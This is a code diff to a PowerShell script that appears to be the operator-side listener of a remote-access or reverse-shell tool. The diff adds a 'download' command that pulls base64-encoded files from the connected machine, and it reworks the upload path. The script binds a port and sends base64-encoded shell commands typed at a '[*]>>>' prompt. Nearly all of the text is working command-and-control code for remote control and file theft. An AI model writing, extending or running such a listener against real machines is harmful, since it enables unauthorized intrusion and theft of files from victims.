@@ -1,12 +1,4 @@
 ﻿
-function SendFile($stream,$filename)
-{
-    $targetFile  = Split-Path $filename -Leaf
-    $fileContent = Get-Content $filename -Encoding Byte
-    $transferStr = "$targetFile*$fileContent"
-    $transferStr | %{ $stream.Write($_) }
-    $stream.Flush()
-}
 function PSHandler($port)
 {
     $socket = New-Object System.Net.IPEndPoint([IPAddress]::Any,$port)
@@ -46,7 +38,6 @@ function PSHandler($port)
                         $transmitter.WriteLine($cmd)
                         $transmitter.Dispose()
                         $receiver.Dispose()
-                        $stream.Close()
                         $client.Close()
                         exit
                     }
@@ -56,18 +47,41 @@ function PSHandler($port)
                        $command     = $plaintext_cmd.Split(' ')[0] 
                        $filename    = $plaintext_cmd.Split(' ')[1] 
                        $filename    = Split-Path $filename -Leaf
-                       
-                       $filecontent = Get-Content $filename -Encoding Byte
-                       $filecontent = [Convert]::ToBase64String([IO.File]::ReadAllBytes($filename))
-                       $transmission = "$command+$filename+$filecontent"
-                       #$transmission = [System.Text.Encoding]::Unicode.GetBytes($transmission)
-                       #$transmission = [Convert]::ToBase64String($transmission) 
-                       #$conv = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($transmission))
+                       $filecontent =  Get-Content $filename -Encoding Byte
+                       $filecontent = [System.Convert]::ToBase64String($filecontent)
+                       $transmission = "$command#$filename#$filecontent"
                        $transmitter.WriteLine($transmission)
                        $transmitter.Flush()
                        $plaintext_cmd         = Read-Host "[*]>>>"
                        $cmd                   = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                        $cmd                   = [Convert]::ToBase64String($cmd)
+                    }
+                    if($plaintext_cmd | Select-String 'download')
+                    {
+                        $command  = $plaintext_cmd.Split(' ')[0]
+                        $filename = $plaintext_cmd.Split(' ')[1]
+                        $transmission = "$command $filename" ; WRite-Host $transmission
+                        $transmitter.WriteLine($transmission)
+                        $transmitter.Flush()
+                        Write-Host "[~] Awaiting download..."
+                        $download = $receiver.ReadLine()
+                        $content  = [System.Convert]::FromBase64String($download)
+                        Set-Content -Path ".\$filename" -Value $content -Encoding Byte
+                        Write-Host "[*] Downloaded: $filename "
+                        $plaintext_cmd = Read-Host "[*]>>>"
+                        $cmd           = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
+                        $cmd           = [Convert]::ToBase64String($cmd)
+                    }
+                    if(($plaintext_cmd | Select-String 'clear') -or ($plaintext_cmd | Select-String 'cls') -or ($plaintext_cmd | Select-String 'Clear-Host'))
+                    {
+                        try
+                        {
+                            Clear-Host
+                        }
+                        catch
+                        {
+                            continue
+                        }
                     }
                     try
                     {
